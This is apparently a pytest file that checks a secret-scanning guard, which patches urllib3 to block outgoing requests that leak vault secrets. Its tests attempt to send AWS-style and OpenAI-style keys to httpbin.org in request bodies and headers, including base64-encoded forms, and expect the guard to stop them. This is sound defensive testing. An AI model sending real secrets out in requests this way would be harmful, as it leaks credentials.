"""Real security tests for preventing secret exfiltration.

Tests verify that the tier1 scanner actually blocks attempts to exfiltrate
secrets via HTTP requests, without mocking the security boundary itself.

NOTE: We don't use responses/httpretty here because they mock at a level that
bypasses our urllib3 patches. Instead, we test by calling urllib3 directly
or by using a local test server.
"""
import pytest
from cryptography.fernet import Fernet
from pathlib import Path
import urllib3

from hermes_aegis.vault.store import VaultStore
from hermes_aegis.tier1.scanner import install_scanner, uninstall_scanner, SecurityError


@pytest.fixture
def vault_path(tmp_path):
    """Provide a temporary vault path."""
    return tmp_path / "vault.enc"


@pytest.fixture
def master_key():
    """Provide a test master key."""
    return Fernet.generate_key()


@pytest.fixture
def vault_with_secret(vault_path, master_key):
    """Create a vault with a test secret."""
    vault = VaultStore(vault_path, master_key)
    vault.set("AWS_SECRET_KEY", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")
    vault.set("OPENAI_API_KEY", "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890ABCD")
    return vault


@pytest.fixture(autouse=True)
def cleanup_scanner():
    """Ensure scanner is cleaned up after each test."""
    yield
    uninstall_scanner()


# Task 3.1: HTTP Body Exfiltration Test
def test_blocks_secret_in_http_body(vault_with_secret):
    """Test that secrets in HTTP request body are blocked."""
    # Install scanner with vault
    install_scanner(vault_with_secret)
    
    # Try to exfiltrate secret in body using urllib3 directly
    http = urllib3.PoolManager()
    secret = vault_with_secret.get("AWS_SECRET_KEY")
    
    with pytest.raises(SecurityError) as exc_info:
        # Use httpbin for testing (won't actually reach it)
        http.request("POST", "http://httpbin.org/post", body=f"secret={secret}")
    
    assert "secret detected in body" in str(exc_info.value).lower()


def test_allows_clean_http_body(vault_with_secret):
    """Test that clean HTTP requests are allowed through."""
    # Install scanner with vault
    install_scanner(vault_with_secret)
    
    # Send clean data using urllib3
    http = urllib3.PoolManager()
    
    # This may fail due to network, but should not raise SecurityError
    try:
        response = http.request("POST", "http://httpbin.org/post", body="clean data")
        # If it succeeded, good
        assert response.status >= 200
    except urllib3.exceptions.HTTPError:
        # Network error is OK, SecurityError would be bad
        pass
    except SecurityError:
        pytest.fail("Clean request was incorrectly blocked")


# Task 3.2: HTTP Header Exfiltration Test
def test_blocks_secret_in_http_headers(vault_with_secret):
    """Test that secrets in HTTP headers are blocked."""
    # Install scanner with vault
    install_scanner(vault_with_secret)
    
    # Try to exfiltrate secret in custom header using urllib3
    http = urllib3.PoolManager()
    secret = vault_with_secret.get("OPENAI_API_KEY")
    
    with pytest.raises(SecurityError) as exc_info:
        http.request("GET", "http://httpbin.org/get", headers={"X-Data": secret})
    
    assert "secret detected in headers" in str(exc_info.value).lower()


def test_allows_clean_headers(vault_with_secret):
    """Test that clean headers are allowed through."""
    # Install scanner with vault
    install_scanner(vault_with_secret)
    
    # Send request with clean headers using urllib3
    http = urllib3.PoolManager()
    
    try:
        response = http.request("GET", "http://httpbin.org/get", headers={"X-Custom": "safe-value"})
        assert response.status >= 200
    except urllib3.exceptions.HTTPError:
        # Network error is OK
        pass
    except SecurityError:
        pytest.fail("Clean request was incorrectly blocked")


# Task 3.3: Base64 Encoding Bypass Test
def test_blocks_base64_encoded_secret(vault_with_secret):
    """Test that base64-encoded secrets are still caught."""
    import base64
    
    # Install scanner with vault
    install_scanner(vault_with_secret)
    
    # Try to exfiltrate base64-encoded secret using urllib3
    http = urllib3.PoolManager()
    secret = vault_with_secret.get("AWS_SECRET_KEY")
    encoded_secret = base64.b64encode(secret.encode()).decode()
    
    with pytest.raises(SecurityError) as exc_info:
        http.request("POST", "http://httpbin.org/post", body=f"data={encoded_secret}")
    
    assert "secret detected in body" in str(exc_info.value).lower()


def test_blocks_secret_pattern_match(vault_with_secret):
    """Test that scanner catches secrets via pattern matching, not just exact vault matches."""
    # Install scanner with vault (which now has pattern-based scanning)
    install_scanner(vault_with_secret)
    
    # Try to exfiltrate a different OpenAI key (not in vault, but matches pattern)
    http = urllib3.PoolManager()
    fake_openai_key = "sk-proj-ABCDEFGHIJKLMNOPabcdefghijklmnop"  # OpenAI API key pattern
    
    with pytest.raises(SecurityError) as exc_info:
        http.request("POST", "http://httpbin.org/post", body=f"apikey={fake_openai_key}")
    
    assert "secret detected" in str(exc_info.value).lower()
